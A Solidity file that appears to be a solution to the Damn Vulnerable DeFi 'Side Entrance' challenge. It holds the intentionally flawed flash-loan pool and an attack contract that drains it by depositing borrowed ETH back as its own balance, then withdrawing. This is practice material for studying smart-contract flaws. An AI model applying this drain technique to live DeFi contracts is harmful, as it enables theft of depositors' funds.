// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
    }
}

contract SideEntranceLenderPoolAttack {
    using Address for address payable;

    SideEntranceLenderPool public immutable pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    receive () external payable {}

    function hack() public {
        require(msg.sender == owner, "only owner");
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        pool.deposit{value: msg.value}();
    }
}